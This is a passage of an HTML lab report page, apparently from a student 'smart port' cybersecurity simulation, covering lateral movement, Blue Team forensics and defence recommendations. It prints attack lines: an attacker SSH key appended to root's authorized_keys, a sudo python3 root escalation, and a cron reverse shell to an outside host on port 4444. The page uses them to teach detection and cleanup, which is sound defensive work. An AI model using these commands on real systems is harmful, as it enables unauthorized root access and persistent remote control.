+<span class="CMD">echo</span> <span class="VAL">"ssh-ed25519 AAAAC3Nz...BackdoorKey attacker@kali"</span> <span class="CMD">&gt;&gt; /root/.ssh/authorized_keys</span>
+<span class="CC"># Attacker can now SSH to root directly, even if all passwords change</span></pre>
+
+      <div class="eye G" style="margin-bottom:12px;margin-top:28px;">Phase 6 — Blue Team Forensic Response</div>
+      <h3 class="DS" style="margin-bottom:12px;">Finding every <span class="tg">trace of the attack</span></h3>
+      <p class="BM" style="margin-bottom:12px;">This is the most important phase — the Blue Team forensic investigation. Using standard Linux tools, we reconstruct the entire attack timeline from system logs, find both backdoors, and remove them. This is exactly what a SOC analyst would do after an incident alert.</p>
+      <pre class="CB G"><span class="CC"># Blue Team Step 1 — Who logged in and when?</span>
+<span class="CMD">last | head -10</span>
+<span class="WRN">portuser pts/3  192.168.64.4  Mon Mar 9 03:07  still logged in</span>
+<span class="WRN">portuser pts/1  192.168.64.4  Mon Mar 9 03:05  still logged in</span>
+<span class="OK">nezuku   tty2   tty2          Mon Mar 9 03:04  still logged in</span>
+<span class="WRN">portuser pts/2  192.168.64.4  Mon Mar 9 02:33 - crash (00:43)</span>
+
+<span class="CC"># Blue Team Step 2 — Find the privilege escalation events</span>
+<span class="CMD">grep "sudo.*python3" /var/log/auth.log | tail -5</span>
+<span class="ERR">03:05:30 sudo: portuser : COMMAND=/usr/bin/python3 -c 'import os; os.system(\'/bin/bash\')'</span>
+<span class="ERR">03:08:07 sudo: portuser : COMMAND=/usr/bin/python3 -c 'import os; os.system(\'/bin/bash\')'</span>
+<span class="CC"># EVIDENCE: timestamp, user, exact escalation command — all in auth.log</span>
+
+<span class="CC"># Blue Team Step 3 — Find the cron backdoor</span>
+<span class="CMD">sudo crontab -l -u root</span>
+<span class="ERR">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.4/4444 0&gt;&amp;1  ← BACKDOOR FOUND</span>
+
+<span class="CC"># Blue Team Step 4 — Find the SSH backdoor key</span>
+<span class="CMD">sudo cat /root/.ssh/authorized_keys</span>
+<span class="ERR">ssh-ed25519 AAAAC3Nz...BackdoorKey attacker@kali  ← UNAUTHORIZED KEY</span>
+
+<span class="CC"># Blue Team Step 5 — CLEANUP</span>
+<span class="CMD">sudo crontab -r -u root</span>                               <span class="CC">← remove cron backdoor</span>
+<span class="CMD">sudo sed -i '/attacker@kali/d' /root/.ssh/authorized_keys</span> <span class="CC">← remove SSH key</span>
+<span class="OK">echo "[CLEANED] Both backdoors removed — system secured"</span>
+<span class="OK">[CLEANED] Both backdoors removed — system secured</span></pre>
+
+      <div class="SIEM">
+        <div class="SIEMH"><span class="SIEMT">siem_sim4.py — Lateral Movement Event Timeline</span><span class="SIEML"><div class="npulse"></div>SIMULATION 4 COMPLETE</span></div>
+        <div class="SIEMB">
+          <div class="SL"><span class="SLT">03:07:11</span><span class="SLEV slH">[HIGH]</span><span class="SLM">SSH_LOGIN — 192.168.64.4 → portuser — successful auth</span></div>
+          <div class="SL"><span class="SLT">03:07:22</span><span class="SLEV slH">[HIGH]</span><span class="SLM">INTERNAL_SCAN — portuser running ss -tlnp, ps aux (post-login recon)</span></div>
+          <div class="SL"><span class="SLT">03:07:42</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">PRIV_ESC — portuser → root via sudo python3 (1 command)</span></div>
+          <div class="SL"><span class="SLT">03:08:11</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">SCADA_ACCESS — direct connection to 127.0.0.1:5020 from root shell</span></div>
+          <div class="SL"><span class="SLT">03:08:22</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">DATA_INJECTION — crane=38500kg / temp=87.5°C (from localhost)</span></div>
+          <div class="SL"><span class="SLT">03:09:05</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">PERSISTENCE — cron reverse shell planted → /dev/tcp/192.168.64.4/4444</span></div>
+          <div class="SL"><span class="SLT">03:09:08</span><span class="SLEV slC">[CRITICAL]</span><span class="SLM">PERSISTENCE — unauthorized SSH key added to /root/.ssh/authorized_keys</span></div>
+          <div class="SL"><span class="SLT">03:10:00</span><span class="SLEV slH">[HIGH]</span><span class="SLM">REVERSE_SHELL — root shell delivered to 192.168.64.4:4444</span></div>
+          <div class="SL"><span class="SLT">03:22:14</span><span class="SLEV slG">[ACTION]</span><span class="SLM">BLUE_TEAM — forensic analysis complete · cron removed · SSH key removed</span></div>
+        </div>
+      </div>
+      <div class="IB G"><div class="ibl">🔵 Blue Team Lesson — Root Cause & Fix</div><p>The root cause is a <strong>single misconfigured sudo rule</strong>. The fix is one line: remove the NOPASSWD python3 entry from /etc/sudoers. Broader mitigations: (1) Apply the principle of least privilege — portuser should NEVER need root access, (2) Use sudo logging and alerting (SUDO_LOG), (3) Implement auditd rules that alert on sudo executions, (4) Consider removing sudo access entirely for service accounts and using systemd services with appropriate permissions instead.</p></div>
+    </div>
+    <div class="SB">
+      <div class="SBC"><div class="SBH">Escalation Chain</div><div class="SBB">
+        <div class="KPI"><span class="KL">Entry point</span><span style="font-family:var(--mono);font-size:9.5px;color:var(--cyan);">portuser SSH</span></div>
+        <div class="KPI"><span class="KL">Escalation vector</span><span style="font-family:var(--mono);font-size:9.5px;color:var(--red);">sudo python3</span></div>
+        <div class="KPI"><span class="KL">Time to root</span><span class="KV tc">&lt;10s</span></div>
+        <div class="KPI"><span class="KL">Backdoors planted</span><span class="KV tr">2</span></div>
+        <div class="KPI"><span class="KL">Shell persistence</span><span class="KV ta">60s interval</span></div>
+        <div class="KPI"><span class="KL">Logs preserved</span><span class="KV tg">100%</span></div>
+      </div></div>
+      <div class="SBC"><div class="SBH">Auth.log Evidence</div><div class="SBB">
+        <div style="font-family:var(--mono);font-size:9.5px;line-height:2;background:var(--void);padding:10px;border:1px solid var(--bdr);">
+          <div style="color:var(--red);">03:07 portuser→root</div>
+          <div style="color:var(--red);">03:08 portuser→root</div>
+          <div style="color:var(--red);">03:08 portuser→root</div>
+          <div style="color:var(--fog);">2026-03-09 — real</div>
+        </div>
+        <p style="font-size:11.5px;color:var(--fog);margin-top:8px;line-height:1.65;">Every sudo escalation is timestamped in auth.log — forensic evidence is complete.</p>
+      </div></div>
+      <div class="SBC"><div class="SBH">Backdoors Found</div><div class="SBB">
+        <div class="KPI"><span class="KL">Cron job</span><span style="font-family:var(--mono);font-size:9px;color:var(--green);">✓ Removed</span></div>
+        <div class="KPI"><span class="KL">SSH backdoor key</span><span style="font-family:var(--mono);font-size:9px;color:var(--green);">✓ Removed</span></div>
+      </div></div>
+    </div>
+  </div>
+</div>
+</section>
+<footer><div class="FL">SIMULATION 04 · LATERAL MOVEMENT & PIVOT · TANGER MED LAB</div><div class="FR"><a onclick="G('sim3')">← Sim 3</a><a onclick="G('def')">Next: Defense →</a></div></footer>
+</div>
+
+<!-- ╔══════════════════════════════════╗
+     ║  DEFENSE PAGE                   ║
+     ╚══════════════════════════════════╝ -->
+<div id="pg-def" class="pg">
+<section class="SH" style="background:var(--abyss);">
+  <div class="SHBG" style="background-image:linear-gradient(rgba(0,230,118,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(0,230,118,.04) 1px,transparent 1px);background-size:60px 60px;inset:0;position:absolute;"></div>
+  <div class="SHNUM" style="color:rgba(0,230,118,.02);">DEF</div>
+  <div class="W" style="position:relative;z-index:1;width:100%;">
+    <div class="BC"><span onclick="G('home')" style="cursor:pointer;color:var(--warm);">Home</span><span class="BCS">›</span><span class="BCC">Defense — Blue Team Response</span></div>
+    <div class="eye G">Blue Team · Proactive security</div>
+    <h1 class="DL">DEFENSE IN <span class="tg">DEPTH</span></h1>
+    <div style="font-family:var(--mono);font-size:13px;letter-spacing:3px;color:var(--fog);margin-top:8px;text-transform:uppercase;">Mechanisms Deployed · Lessons · Recommendations</div>
+  </div>
+</section>
+<section class="SP">
+<div class="W">
+  <div class="eye G rv">Defensive Mechanisms Deployed</div>
+  <h2 class="DM rv" style="margin-bottom:8px;">3 layers, <span class="tg">100%</span> detection rate</h2>
+  <p class="BM rv" style="max-width:580px;">Every attack met a defensive response. The key insight: <strong>defense in depth</strong> means no single layer needs to be perfect — they complement each other. An attacker who bypasses Fail2ban still gets caught by the honeypot. An attack that evades the honeypot triggers SIEM rules. Layered defense works.</p>
+  <div class="DEFG rv">
+    <div class="DC D0"><span class="DCico">🍯</span><h4>SSH Honeypot</h4><p>Python + Paramiko fake SSH server on port 2222. Authenticates the SSH handshake but never grants access. Silently captures every credential attempted. 89 attacker credentials harvested in Simulation 2 with full IP and timestamp logging.</p></div>
+    <div class="DC D1"><span class="DCico">🚫</span><h4>Fail2ban Progressive</h4><p>After 5 SSH failures in 60 seconds, IP is blocked via iptables. bantime.increment doubles the ban duration on each recurrence: 1 min → 2 min → 4 min. Exponential backoff discourages persistent automated attacks without blocking legitimate users.</p></div>
+    <div class="DC D2"><span class="DCico">📊</span><h4>Python SIEM Custom</h4><p>Monitors /var/log/auth.log and /var/log/scada_server.log in real time. 8 detection rules covering SSH brute force, SCADA anomalies, ARP spoofing, and lateral movement events. All 4 simulations detected in under 1 second each.</p></div>
+    <div class="DC D3"><span class="DCico">🗺️</span><h4>CVE Auto-Mapping</h4><p>Python script correlates Nmap scan results with CVE database to generate instant vulnerability assessment. Produces PDF reports with CVSS scores, impact analysis, and remediation priorities — exactly what a professional VA report contains.</p></div>
+    <div class="DC D4"><span class="DCico">🔍</span><h4>Forensic Analysis</h4><p>Complete post-incident investigation using last, auth.log grep, crontab inspection, and authorized_keys review. Both backdoors identified and removed within minutes. Full attack timeline reconstructed from logs — 100% forensic coverage.</p></div>
+    <div class="DC D5"><span class="DCico">🔗</span><h4>Unified Kill Chain</h4><p>All 4 simulations feed into the same log infrastructure. SSH alerts from Sim 2 and SCADA anomalies from Sim 3 coexist in the same SIEM — exactly like a real SOC. The correlation between events is what reveals the full APT picture.</p></div>
+  </div>
+
+  <div style="margin-top:32px;" class="rv">
+    <div class="eye G">Consolidated Results — What We Proved</div>
+    <h2 class="DM" style="margin-bottom:24px;">Key <span class="tg">findings & proofs</span></h2>
+    <div style="display:flex;flex-direction:column;gap:10px;">
+      <div class="PROOT P0"><h5>tangermed2024 cracked in 4 attempts — not millions</h5><p>OSINT contextual wordlists are exponentially more efficient than generic lists. Password policies must go beyond complexity — service accounts in SCADA environments must use SSH key authentication only.</p></div>
+      <div class="PROOT P1"><h5>89 attacker credentials captured in honeypot — full intelligence</h5><p>The attacker had no idea they were in a trap after port 22 was blocked. Honeypots convert attackers into intelligence sources. Every credential they try reveals their wordlist strategy.</p></div>
+      <div class="PROOT P2"><h5>CVSS 10.0 vulnerability found with a 13-second Nmap scan</h5><p>The most dangerous vulnerability in the lab required zero exploitation skill — just running Nmap and seeing that port 5020 has no authentication. Misconfiguration is more dangerous than missing patches.</p></div>
+      <div class="PROOT P3"><h5>Root access in 1 command from a low-privilege user</h5><p>A single misconfigured sudo rule (python3 NOPASSWD) turned a restricted portuser account into complete root control in under 10 seconds. Principle of least privilege is non-negotiable in critical infrastructure.</p></div>
+    </div>
+  </div>
+
+  <div style="margin-top:32px;" class="rv">
+    <div class="eye G">Concrete Recommendations</div>
+    <h2 class="DM" style="margin-bottom:8px;">8 fixes that would have <span class="tg">stopped everything</span></h2>
+    <p class="BM" style="max-width:560px;margin-bottom:0;">Each recommendation directly addresses a demonstrated vulnerability. Implementation priority is ordered by CVSS score — highest risk first.</p>
+    <div class="RECG">
+      <div class="RCC RC0"><div class="RCBDG">CRITICAL — SCADA-001</div><h4>Authenticate SCADA</h4><p>Replace custom TCP protocol with Modbus/TLS or OPC-UA. Implement mutual TLS authentication. Deploy an OT-aware firewall (Fortinet FortiGate OT, Cisco IE). Zero auth on an industrial interface is the single most dangerous finding in this entire lab.</p></div>
+      <div class="RCC RC0"><div class="RCBDG">CRITICAL — Sim 2</div><h4>Patch CVE-2024-6387</h4><p>RegreSSHion (CVSS 9.8) requires patching within 72 hours. Implement automated CVE monitoring against NVD for all services. Set SLAs: Critical CVEs patched in 72h, High CVEs in 7 days, Medium in 30 days. No exceptions for SCADA environments.</p></div>
+      <div class="RCC RC0"><div class="RCBDG">CRITICAL — Sim 4</div><h4>Remove sudo NOPASSWD</h4><p>Remove all NOPASSWD sudo rules for service accounts immediately. Apply principle of least privilege: portuser should have NO sudo access. Use systemd services with appropriate user permissions for SCADA scripts. Audit all sudoers files across the port network.</p></div>
+      <div class="RCC RC1"><div class="RCBDG">HIGH — Sim 2</div><h4>SSH Keys + MFA</h4><p>Disable PasswordAuthentication in /etc/ssh/sshd_config for all SCADA servers. Deploy Ed25519 or RSA-4096 key pairs for all admin accounts. Add TOTP (Google Authenticator or Duo) as a second factor. Brute force becomes mathematically impossible with key-only auth.</p></div>
+      <div class="RCC RC1"><div class="RCBDG">HIGH — Sim 1</div><h4>Network Segmentation</div><p>Deploy dedicated VLANs for OT/SCADA networks. No IT device should have direct access to SCADA ports. Firewall rules: deny all → permit only (allowlist). The fact that Kali could reach port 5020 directly from the same network is a fundamental architecture failure.</p></div>
+      <div class="RCC RC1"><div class="RCBDG">HIGH — Sim 1</div><h4>Close Open Proxy</h4><p>Disable anonymous access on Squid proxy or restrict to specific authenticated IPs. An open proxy on port infrastructure is a free anonymization service for attackers. Configure Squid with ACLs, authentication (NTLM/Kerberos), and SSL bump inspection.</p></div>
+      <div class="RCC RC2"><div class="RCBDG">MEDIUM — Defense</div><h4>Permanent Honeypots</h4><p>Move real SSH to a non-standard port (e.g., 2200). Keep honeypot on port 22. Deploy Conpot for ICS/SCADA honeypotting on port 5020. Use T-Pot or OpenCanary for full honeypot infrastructure. Convert attackers into intelligence sources continuously.</p></div>
+      <div class="RCC RC2"><div class="RCBDG">MEDIUM — SIEM</div><h4>24/7 OT SOC</h4><p>Deploy Wazuh, Splunk, or Microsoft Sentinel with OT-specific rule packs (Modbus, DNP3, IEC 60870-5-104). Train a dedicated SOC team with both IT and OT expertise. Implement automated incident response playbooks — SIEM alerts must trigger automated containment within 60 seconds.</p></div>
+    </div>
+  </div>
+</div>
+</section>
+<footer><div class="FL">DEFENSE · BLUE TEAM · SMART PORT CYBERSECURITY LAB · 2026</div><div class="FR"><a onclick="G('sim4')">← Sim 4</a><a onclick="G('home')">Home</a></div></footer>
+</div>
+
+<!-- ═══════════════ SCRIPTS ═══════════════ -->
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+// Custom cursor
+const cur=document.getElementById('CUR'),cur2=document.getElementById('CUR2');
+document.addEventListener('mousemove',e=>{
+  cur.style.left=e.clientX+'px';cur.style.top=e.clientY+'px';
+  cur2.style.left=e.clientX+'px';cur2.style.top=e.clientY+'px';
+});
+document.querySelectorAll('button,a,[onclick]').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{cur2.style.transform='translate(-50%,-50%) scale(2.2)';cur2.style.borderColor='var(--cyan)';});
+  el.addEventListener('mouseleave',()=>{cur2.style.transform='translate(-50%,-50%) scale(1)';cur2.style.borderColor='rgba(0,220,200,.35)';});
+});
+
+// Page navigation
+function G(p){
+  document.querySelectorAll('.pg').forEach(x=>x.classList.remove('on'));
+  document.querySelectorAll('.nl').forEach(x=>x.classList.remove('on'));
+  const pg=document.getElementById('pg-'+p),nl=document.getElementById('NL-'+p);
+  if(pg){pg.classList.add('on');}
+  if(nl){nl.classList.add('on');}
+  window.scrollTo(0,0);
+  setTimeout(()=>{initReveal();},60);
+}
+
+// Scroll reveal
+function initReveal(){
+  const io=new IntersectionObserver(ents=>{
+    ents.forEach(e=>{if(e.isIntersecting){e.target.classList.add('vis');io.unobserve(e.target);}});
+  },{threshold:0.06});
+  document.querySelectorAll('.rv:not(.vis)').forEach(el=>io.observe(el));
+}
+initReveal();
+
+// Hero Canvas — Particle network
+(function(){
+  const canvas=document.getElementById('heroCanvas');
+  if(!canvas)return;
+  const ctx=canvas.getContext('2d');
+  let W,H,pts;
+  function resize(){W=canvas.width=canvas.offsetWidth;H=canvas.height=canvas.offsetHeight;}
+  resize();
+  window.addEventListener('resize',()=>{resize();init();});
+  function init(){
+    pts=[];
+    const n=Math.min(90,Math.floor(W*H/10000));
+    for(let i=0;i<n;i++)pts.push({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.45,vy:(Math.random()-.5)*.45,r:Math.random()*1.4+.4,a:Math.random()*.35+.08});
+  }
+  init();
+  function draw(){
+    ctx.clearRect(0,0,W,H);
+    for(let i=0;i<pts.length;i++){
+      for(let j=i+1;j<pts.length;j++){
+        const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.sqrt(dx*dx+dy*dy);
+        if(d<130){ctx.beginPath();ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.strokeStyle=`rgba(0,220,200,${.07*(1-d/130)})`;ctx.lineWidth=.4;ctx.stroke();}
+      }
+    }
+    pts.forEach(p=>{
+      ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fillStyle=`rgba(0,220,200,${p.a})`;ctx.fill();
+      p.x+=p.vx;p.y+=p.vy;
+      if(p.x<0||p.x>W)p.vx*=-1;if(p.y<0||p.y>H)p.vy*=-1;
+    });
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+// Live terminal stream
+const EVENTS=[
+  {c:'lg',t:'[03:07:11] L5  | Rule 100001 | SSH LOGIN — portuser@192.168.64.2 from 192.168.64.4'},
+  {c:'lr',t:'[03:07:42] L10 | Rule 200004 | PRIV_ESC — sudo python3 → root shell obtained'},
+  {c:'lr',t:'[03:08:22] L10 | Rule 100002 | SCADA INJECT — crane=38500kg (real: 14676kg)'},
+  {c:'lr',t:'[03:08:22] L10 | Rule 100003 | SCADA INJECT — temp=87.5°C (real: 3.54°C)'},
+  {c:'la',t:'[03:01:46] L5  | HONEYPOT    | 192.168.64.4 → portuser/tangermed2024 CAPTURED'},
+  {c:'la',t:'[03:09:05] L10 | PERSISTENCE | cron reverse shell planted → /dev/tcp/:4444'},
+  {c:'la',t:'[03:09:08] L10 | PERSISTENCE | SSH backdoor key → /root/.ssh/authorized_keys'},
+  {c:'lg',t:'[02:59:41] L7  | FAIL2BAN    | IP 192.168.64.4 banned (1 min — ban #1)'},
+  {c:'lb',t:'[02:42:14] L5  | RECON       | Nmap scan from 192.168.64.4 → 4 services found'},
+  {c:'lr',t:'[03:10:00] L10 | REVERSE     | root shell delivered → Kali 192.168.64.4:4444'},
+  {c:'lg',t:'[03:22:14] OK  | BLUE TEAM   | Forensics done · backdoors removed · system clean'},
+];
+let idx=0;
+const tss=document.getElementById('TSS');
+function addEvent(){
+  if(!tss)return;
+  const ev=EVENTS[idx%EVENTS.length];
+  const d2=document.createElement('div');
+  d2.className=ev.c;
+  d2.textContent=ev.t;
+  tss.appendChild(d2);
+  tss.parentElement.scrollTop=tss.parentElement.scrollHeight;
+  idx++;
+}
+setInterval(addEvent,1800);
+addEvent();
+</script>
+</body>
+</html>
